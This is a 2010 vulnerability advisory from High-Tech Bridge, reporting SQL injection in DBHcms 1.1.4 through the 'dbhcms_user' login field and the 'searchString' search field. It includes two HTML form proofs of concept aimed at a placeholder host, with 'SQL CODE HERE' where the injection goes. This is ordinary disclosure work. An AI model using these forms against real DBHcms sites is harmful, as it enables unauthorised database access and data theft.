@@ -1,0 +1,39 @@
+Vulnerability ID: HTB22651
+Reference: http://www.htbridge.ch/advisory/sql_injection_in_dbhcms.html
+Product: DBHcms 
+Vendor: drbenhur.com ( http://www.drbenhur.com/ ) 
+Vulnerable Version: 1.1.4 and probably prior versions
+Vendor Notification: 13 October 2010 
+Vulnerability Type: SQL Injection
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: High 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+The vulnerability exists due to failure in the "index.php" script to properly sanitize user-supplied input in "dbhcms_user" variable.
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+
+<form action="http://host/" method="post" name="main" >
+<input type="hidden" name="dbhcms_user" value="'SQL CODE HERE" />
+<input type="hidden" name="dbhcms_passwd" value="password" />
+<input type="submit" value="Login" name="submit" />
+</form>
+
+
+The vulnerability exists due to failure in the "index.php" script to properly sanitize user-supplied input in "searchString" variable.
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+
+<form action="http://host/index.php?dbhcms_did=1&dbhcms_pid=11&dbhcms_lang=en" method="post" name="search" />
+<input name="dbhcmsCache" value="CT_OFF" type="hidden" />
+<input name="todo" value="searchExecute" type="hidden" />
+<input name="searchString" value="'SQL CODE HERE" type="hidden" />
+<input type="submit" value="Search" name="submit" />
+</form>
+
+
+
+
